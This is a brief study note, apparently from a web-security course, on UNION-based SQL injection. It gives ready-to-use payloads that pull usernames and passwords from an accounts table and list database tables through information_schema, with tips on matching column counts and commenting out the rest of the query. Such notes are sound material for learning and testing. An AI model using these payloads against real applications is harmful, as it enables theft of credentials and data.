---
tags:
  - sqlInjection
---

# SQL Injection UNION-based Payloads

Use UNION to get information about another table. 
Usually  original sql looks like:
```sql
select id, title, description, price from newws where id= <input value>
```
We can use sql injection for getting information form another table, for example from accounts:
Payload:
```sql
0 UNION ALL SELECT ID, USERNAME, PASSWORD, 1 from  accounts
```
Result query:
```sql
select id, title, description, price from newws where id=0 UNION ALL SELECT ID, USERNAME, PASSWORD, 1 from  accounts
```

## Notes
1. Number of columns must be the same in the tables
2. Types of columns can be different in the tables in **MYSQL**. . In Postgres and MSSQL types of columns must be the same in the tables. 
3. Use -- to comment part of original SQL 
Payload:
```sql
test')) UNION ALL select NULL, table_name, table_schema, 0  from information_schema.tables where table_schema not in ('information_schema', 'mysql', 'performance_schema', 'sys')-- 
```
2. Use ', ).. to finish first part of  original SQL

## References

1. web200.SQL Injection.Exploiting SQL Injection. UNION-based Payloads
2. (Microsoft, 2021), [https://docs.microsoft.com/en-us/sql/t-sql/language-elements/set-operators-union-transact-sql?view=sql-server-ver15](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/set-operators-union-transact-sql?view=sql-server-ver15)

